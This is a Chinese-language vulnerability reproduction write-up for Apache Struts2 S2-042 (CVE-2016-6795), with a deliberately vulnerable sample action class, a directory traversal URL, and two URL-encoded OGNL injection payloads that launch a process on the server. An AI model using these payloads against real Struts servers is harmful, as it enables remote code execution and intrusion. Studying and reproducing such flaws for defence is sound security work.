<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2016-6795）s2-042</h1><h2>一、漏洞简介</h2><p>在进行struts2开发时，需要在配置文件(struts.xml)中写一个个action，和对应返回结果的result(可以理解为前端返回的jsp文件)。<br />但是，写的action多了，配置起来就显得特别繁琐了。struts2 Convention插件可以完全抛弃配置，也就是约定优于配置<br />通过这个插件来实现目录的遍历</p><h2>二、漏洞影响</h2><p>Struts 2.3.20 - Struts 2.3.31</p><h2>三、复现过程</h2><ol class="pydocx-list-style-type-decimal"><li>测试环境搭建</li></ol><ul><li>**(1)**struts版本: struts2.3.24.1</li><li>**(2)**convention插件版本: struts2-convention-plugin-2.3.24.1</li></ul><p>将struts2-convention-plugin-2.3.24.1.jar复制到/WEB-INF/lib目录下。</p><ol class="pydocx-list-style-type-decimal"><li>样例代码</li></ol><p>新建一个GoAction类，放在action包下(convention插件的默认约定位置)。</p><p>package action;<br /><br />import com.opensymphony.xwork2.ActionSupport;<br /><br />public class GoAction extends ActionSupport {<br /><br />    private String go;<br />    private String methodToOGNL;<br /><br />    public String execute(){<br />        return go;  //方法的返回值，即为resultCode<br />    }<br /><br />    public String getGo() {<br />        return go;<br />    }<br />    public void setGo(String go) {<br />        this.go = go;<br />    }<br />    public String getMethodToOGNL() {<br />        return methodToOGNL;<br />    }<br />    public void setMethodToOGNL(String methodToOGNL) {<br />        this.methodToOGNL = methodToOGNL;<br />    }        <br />}</p><p>在/WEB-INF/content目录下，新建一个admin.jsp:</p><p>&lt;body&gt;      Hello Admin~~ &lt;br&gt;<br />  &lt;/body&gt; </p><ol class="pydocx-list-style-type-decimal"><li>攻击和调试分析</li></ol><p>上述代码目的是，让GoAction起到一个跳转功能。</p><p>当admin用户经过验证，需要跳转到jsp页面时。 直接访问url:/go?go=admin，此时的resultCode为admin。 通过convention插件，会在/WEB-INF/content找到admin.jsp，返回给用户。<br />1.png<br />此时，我们就可以通过go参数来控制resultCode。</p><ol class="pydocx-list-style-type-decimal"><li><strong>遍历目录读取文件</strong></li></ol><p>不防先试试跨目录。测试Payload为:</p><p>http://www.0-sec.org:8080/MyStruts2Test/go?go=../content/admin  </p><p>这样也成功找到了admin.jsp。</p><p>然后，在/WEB-INF/下新建一个hack.jsp文件。简单的跨目录读取成功:</p><p>1.png<br /><strong>(2)执行任意代码</strong></p><p>在补丁分析时，我们看到修补了一个Result执行命令。于是，我们可以在resultCode中嵌入ognl代码试试~ 我们最后要找到admin.jsp文件，于是在路径中嵌入了如下Payload:</p><p>http://www.0-sec.org:8080/MyStruts2Test/go?go=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27calc%27%29.start%28%29%7D%2f..%2fadmin</p><p>打断点分析可以看到:</p><p>1.png</p><p>找到admin.jsp文件后的Result为org.apache.struts2.dispatcher.ServletDispatcherResult对象，并且parse属性为true。location属性中带有OGNL语句，和S2-016漏洞一样，成功运行植入的代码，弹出计算器:</p><p>2.png</p><p><strong>(3)另一种控制</strong><strong>resultCode</strong><strong>方法</strong></p><p>可能注意到了methodToOGNL这个变量没有用，当我们可以选择调用action的某个方法时，比如还有最近出现的rest插件或者打开动态方法调用：</p><p>&lt;constant name="struts.enable.DynamicMethodInvocation" value="true" /&gt;</p><p>于是就有了如下payload:</p><p>http://www.0-sec.org:8080/MyStruts2Test/go!getMethodToOGNL?methodToOGNL=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27calc%27%29.start%28%29%7D%2f..%2fadmin</p><p>我调用了getMethodToOGNL方法，返回methodToOGNL变量的值。就能简接控制resultCode了。当然成功弹出计算器。这种情况，相比前面的情况。恐怕就要普遍些了吧~</p><p><strong>条件: 只需</strong><strong>action</strong><strong>中有个</strong><strong>String</strong><strong>变量即可。</strong></p></body></html>